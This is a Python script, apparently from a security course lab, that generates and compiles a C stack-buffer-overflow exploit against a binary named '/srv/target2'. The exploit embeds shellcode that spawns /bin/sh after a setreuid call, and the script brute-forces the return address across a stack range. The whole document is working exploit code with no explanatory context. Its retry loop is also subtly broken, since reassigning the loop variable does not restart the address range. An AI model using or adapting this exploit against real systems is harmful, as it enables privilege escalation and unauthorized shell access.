import subprocess

def try_exploit(buffer_size, addr):
    with open("tmp_sploit2.c", "w") as f:
        f.write(f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target2"

char shellcode[] = 
  "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\xa4\\xb3\\x1f\\xb1\\x1f\\xb2\\x1f"
  "\\xcd\\x80\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"
  "\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8"
  "\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh";

int main(void)
{{
  char *args[3];
  char *env[1];

  char buffer[{buffer_size}];
  memset(buffer, 0x90, {buffer_size});
  memcpy(buffer + {buffer_size} - sizeof(shellcode), shellcode, sizeof(shellcode));

  unsigned long *addr_ptr = (unsigned long *)(buffer + {buffer_size} - sizeof(shellcode) - 8);
  *addr_ptr = {addr};

  args[0] = TARGET;
  args[1] = buffer;
  args[2] = (char *)({buffer_size} - 1);
  
  env[0] = NULL;

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\\n");

  return 0;
}}
''')
    subprocess.run(["gcc", "-fno-stack-protector", "-z", "execstack", "-o", "tmp_sploit2", "tmp_sploit2.c"])
    p = subprocess.run(["./tmp_sploit2"], capture_output=True)
    return p.returncode == 0

buffer_size = 500 
for addr in range(0xffffcf00, 0xffffcfff, 4):
    print(f"Trying address {hex(addr)} with buffer size {buffer_size}...")
    if try_exploit(buffer_size, addr):
        print(f"Successful exploit with buffer size {buffer_size} and address {hex(addr)}!")
        break
    if addr == 0xffffcffc:
        buffer_size += 1
        addr = 0xffffcf00